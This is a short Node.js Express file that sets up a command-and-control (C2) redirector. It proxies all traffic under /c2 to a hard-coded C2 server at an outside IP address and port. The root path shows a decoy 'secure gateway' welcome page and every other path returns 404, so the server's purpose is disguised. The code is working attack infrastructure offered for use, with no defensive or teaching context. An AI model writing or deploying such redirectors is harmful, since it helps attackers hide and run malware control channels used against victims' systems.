const express = require('express');
const { createProxyMiddleware } = require('http-proxy-middleware');
const helmet = require('helmet');

const app = express();
const PORT = process.env.PORT || 6465;
const TARGET_C2_URL = process.env.TARGET_C2_URL || 'http://31.57.147.77:6464';

// Use Helmet to add security headers
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  }
}));

// Proxy middleware for all C2 endpoints
app.use('/c2', createProxyMiddleware({
  target: TARGET_C2_URL,
  changeOrigin: true,
  pathRewrite: {
    '^/c2': '' // Remove /c2 prefix when forwarding to target
  },
  onProxyReq: (proxyReq, req, res) => {
    // Optionally log or modify requests here
    console.log(`Proxying request to: ${proxyReq.path}`);
  }
}));

// Redirect root to a harmless page or return a 404
app.get('/', (req, res) => {
  res.status(200).send('<h1>Welcome</h1><p>This is a secure gateway.</p>');
});

// Catch-all for other requests
app.all('*', (req, res) => {
  res.status(404).send('Not Found');
});

app.listen(PORT, () => {
  console.log(`C2 Redirector running on port ${PORT}, proxying to ${TARGET_C2_URL}`);
});
